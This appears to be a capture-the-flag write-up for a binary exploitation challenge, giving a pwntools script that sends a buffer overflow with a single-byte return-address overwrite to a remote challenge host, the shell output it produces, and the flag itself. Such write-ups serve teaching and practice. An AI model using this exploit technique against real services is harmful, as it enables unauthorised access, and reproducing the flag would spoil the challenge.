# Exploit

## Time is but a Window

Think small, and simple. No fancy ROP chains or shellcode necessary, a single byte should be sufficient.

[Download exploit3.bin](https://uwspedu-my.sharepoint.com/:u:/g/personal/cjohnson_uwsp_edu/EaNv_nOgYrlPtujJa3Jv3rcBAt6DxbNU_wpfWSCTW-deBQ?e=EhYnoV)

Binary is running at 34.123.210.162 port 20234

---

### Solution

```python
# file: pay.py
from pwn import *

# p = process('exploit3.bin')
p = remote('34.123.210.162', 20234)

payload = b'AAAAAAAAAAAAAAAAAAAAAAAA\xcb'
p.recvuntil("name?: ")
p.sendline(payload)
p.interactive()
```


```bash
$ python pay.py        
[+] Opening connection to 34.123.210.162 on port 20234: Done
[*] Switching to interactive mode
Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAA\xcb\xe3|%\x0eV!
$ ls
exploit3.bin
flag.txt
$ cat flag.txt
poctf{uwsp_71m3_15_4_f4c702} 
```

### poctf{uwsp_71m3_15_4_f4c702} 